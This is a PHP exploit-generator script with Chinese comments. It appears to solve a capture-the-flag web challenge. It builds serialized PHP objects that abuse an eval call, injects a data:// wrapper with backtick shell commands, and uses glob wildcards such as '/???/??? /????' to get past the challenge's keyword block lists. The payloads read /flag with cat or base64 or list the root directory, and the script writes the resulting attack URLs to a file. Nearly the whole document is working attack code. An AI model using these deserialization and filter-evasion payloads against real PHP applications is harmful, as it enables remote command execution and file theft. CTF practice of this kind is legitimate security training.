<?php
// 生成exploit payload
// 利用__construct中的eval执行代码

// 方案：使用data://伪协议 + 通配符绕过
// $a = ';include("data:,<?=`/???/???%20/???`;");'
// $b = '//'

// 但是我们需要更精确的命令来读取flag
// 使用通配符：/bin/cat /flag

// 构造payload
class FLAG {
    private $a;
    protected $b;
}

$obj = new FLAG();

// 设置private和protected属性需要使用特殊方法
// private $a 的序列化格式：FLAG\x00a
// protected $b 的序列化格式：\x00*\x00b

// 方案1：使用通配符命令
// /bin/cat /flag -> /???/??? /????
// 但问题是命令中的空格和具体字符

// 让我尝试data://伪协议执行PHP代码
// data:,<?=`command`;?>

$a = ';include("data:,<?=`/???/???%20/????`;");';
$b = '//';

echo "=== 方案1：使用通配符命令 ===\n";
echo "\$a = " . var_export($a, true) . "\n";
echo "\$b = " . var_export($b, true) . "\n";
echo "eval(\$a.\$b) = eval('" . $a . $b . "');\n\n";

// 检查过滤
$blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
$blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

$pattern_a = '/' . implode('|', array_map(function($item) { return preg_quote($item, '/'); }, $blocked_a)) . '/i';
$pattern_b = '/' . implode('|', array_map(function($item) { return preg_quote($item, '/'); }, $blocked_b)) . '/i';

if (preg_match($pattern_a, $a)) {
    echo "❌ \$a被blocked_a过滤\n";
} else {
    echo "✓ \$a通过blocked_a检查\n";
}

if (preg_match($pattern_b, $b)) {
    echo "❌ \$b被blocked_b过滤\n";
} else {
    echo "✓ \$b通过blocked_b检查\n";
}

echo "\n";

// 构造序列化字符串
// 需要设置private和protected属性

// 使用反射或直接构造序列化字符串
$ser = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a) . ':"' . $a . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b) . ':"' . $b . '";}';

echo "=== 序列化字符串 ===\n";
echo bin2hex($ser) . "\n\n";
echo "URL编码:\n";
echo urlencode($ser) . "\n\n";

// 生成完整URL
$url = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser);
echo "=== 完整URL ===\n";
echo $url . "\n\n";

echo "=== 方案2：尝试更简单的命令 ===\n";
// /bin/??? /????? 可能匹配 /bin/cat /flag
// 但我们需要确保通配符能正确展开

$a2 = ';include("data:,<?=`/*`;");';  // 尝试列出根目录
$b2 = '//';

echo "\$a = " . var_export($a2, true) . "\n";
echo "\$b = " . var_export($b2, true) . "\n";

if (preg_match($pattern_a, $a2)) {
    echo "❌ \$a被blocked_a过滤\n";
} else {
    echo "✓ \$a通过blocked_a检查\n";
}

if (preg_match($pattern_b, $b2)) {
    echo "❌ \$b被blocked_b过滤\n";
} else {
    echo "✓ \$b通过blocked_b检查\n";
}

$ser2 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a2) . ':"' . $a2 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b2) . ':"' . $b2 . '";}';
$url2 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser2);

echo "\nURL2:\n$url2\n\n";

echo "=== 方案3：使用更精确的路径 ===\n";
// /bin/base64 /flag - 用base64读取可能更可靠
$a3 = ';include("data:,<?=`/???/????64%20/????`;");';
$b3 = '//';

echo "\$a = " . var_export($a3, true) . "\n";
echo "\$b = " . var_export($b3, true) . "\n";

if (preg_match($pattern_a, $a3)) {
    echo "❌ \$a被blocked_a过滤\n";
} else {
    echo "✓ \$a通过blocked_a检查\n";
}

if (preg_match($pattern_b, $b3)) {
    echo "❌ \$b被blocked_b过滤\n";
} else {
    echo "✓ \$b通过blocked_b检查\n";
}

$ser3 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a3) . ':"' . $a3 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b3) . ':"' . $b3 . '";}';
$url3 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser3);

echo "\nURL3 (base64):\n$url3\n\n";

// 保存URL到文件
file_put_contents('payload_urls.txt', "Payload 1 (cat):\n$url\n\nPayload 2 (ls):\n$url2\n\nPayload 3 (base64):\n$url3\n");
echo "✓ URLs已保存到 payload_urls.txt\n";
